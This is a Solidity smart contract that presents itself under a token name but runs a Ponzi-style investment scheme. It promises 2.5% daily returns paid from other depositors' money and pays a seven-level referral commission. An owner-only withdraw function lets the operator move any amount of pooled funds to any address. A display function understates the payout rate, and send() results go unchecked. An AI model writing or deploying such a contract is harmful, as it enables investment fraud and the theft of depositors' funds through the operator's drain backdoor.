 

 


pragma solidity ^0.4.21;
 
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

   
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
     
     
    return a / b;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }


  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}
 
library Fdatasets {
 
    struct Player {
        address affadd;                 
        uint256 atblock;                 
        uint256 invested;                 
        uint256 pot;                
        uint256 touzizongshu;       
        uint256 tixianzongshu;      
        uint256 yongjin;
    }  
    
}

contract TokenERC20 {
	
    using SafeMath for uint256;
 
    
    
    uint256 public commission  = 10; 
    uint256 public investeds;        
    uint256 public amountren;          
    address public owner       = 0xc47E655BC521Bf15981134E392709af5b25947B4; 
    address aipi;
    
    
     
    mapping(address  => Fdatasets.Player)public users;
    
    modifier olyowner() {
        require(msg.sender == owner || msg.sender == aipi); 
        _;
    }
    
    function TokenERC20()public  payable{
       amountren = 0;
       investeds = 0; 
       aipi = msg.sender;
    }
    
    function () payable public {
       
    	 
         
        if (users[msg.sender].invested != 0) {
             
             
             
            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;

             
            if(this.balance < amount ){
                amount = this.balance;
            }
            address sender = msg.sender;
            sender.send(amount);
            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu);  
        }

         
        users[msg.sender].atblock = now;
        users[msg.sender].invested += msg.value;
        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu); 
         
        if(msg.value > 0){
            amountren++;
            investeds = investeds.add(msg.value);
            
             
             users[owner].pot = users[owner].pot + (msg.value * commission / 100);
            address a = users[msg.sender].affadd;
            for(uint256 i = 0; i < 7; i++){
                if(i == 0 && a != address(0)){
                    a.send(msg.value * 8 / 100 ); 
                    users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 
                }
                    
                if(i == 1 && a != address(0)){
                    a.send(msg.value * 5 / 100 );
                    users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 
                }
                     
                if(i == 2  && a != address(0)){
                    a.send(msg.value * 3 / 100 ); 
                    users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 
                }
                    
                if(i > 2  &&  a != address(0)){
                    a.send(msg.value * 1 / 100 ); 
                    users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 
                }
                a = users[a].affadd;       
            }  
        } 
    }
    
     
    function withdraw(uint256 _amount,address _owner)public olyowner returns(bool){
        _owner.send(_amount);
        return true;
    }
    
     
    function withdrawcommissions()public olyowner returns(bool){
        owner.send(users[msg.sender].pot);
        users[msg.sender].pot=0;
    }
    
     
    function commissions(uint256 _amount)public olyowner returns(bool){
        commission = _amount;
    }
 
      
    function gettw(address _owner)public view returns(uint256){
        uint256 amount;
     
        amount = users[_owner].invested * 2 / 100 * (now - users[_owner].atblock) / 86400;
       
        return amount;
    }
 
    
     
    function getthis()public view returns(uint256){ 
        return this.balance;
    }
    
     
    function getamount()public view returns(uint256,uint256){ 
        return (amountren,investeds);
    }
 
     
    function gets(address _owner)public view returns(uint256,uint256,uint256){
        uint256 a = users[_owner].touzizongshu;
        uint256 b = users[_owner].tixianzongshu;
        uint256 c = users[_owner].yongjin;
        return (a,b,c);
    }
  
    function investedbuy(address _owner)public payable  {
        require(msg.sender != _owner); 
        amountren++;
        investeds = investeds.add(msg.value);
        users[msg.sender].affadd = _owner;
         
        users[owner].pot = users[owner].pot + (msg.value * commission / 100);
        address a = users[msg.sender].affadd;
         
        for(uint256 i = 0; i < 7; i++){
            if(i == 0 && a != address(0)){
                a.send(msg.value * 8 / 100 );
                users[a].yongjin = users[a].yongjin.add(msg.value * 8 / 100 ); 
            }
                    
            if(i == 1 && a != address(0)){
                a.send(msg.value * 5 / 100 );
                users[a].yongjin = users[a].yongjin.add(msg.value * 5 / 100 ); 
            }
                     
            if(i == 2  && a != address(0)){
                a.send(msg.value * 3 / 100 ); 
                users[a].yongjin = users[a].yongjin.add(msg.value * 3 / 100 ); 
            }
                    
            if(i > 2  &&  a != address(0)){
                a.send(msg.value * 1 / 100 );
                users[a].yongjin = users[a].yongjin.add(msg.value * 1 / 100 ); 
            }
             a = users[a].affadd;           
        } 
        users[msg.sender].touzizongshu = msg.value.add(users[msg.sender].touzizongshu); 
          
        if (users[msg.sender].invested != 0) {
             
             
             
            uint256 amount = users[msg.sender].invested * 25 / 1000 * (now - users[msg.sender].atblock) / 86400;

             
            if(this.balance < amount ){
                amount = this.balance;
            }
            address sender = msg.sender;
            sender.send(amount);
            users[msg.sender].tixianzongshu = amount.add(users[msg.sender].tixianzongshu);  
        }
        users[msg.sender].atblock = now;
        users[msg.sender].invested += msg.value;
     
    } 
  

}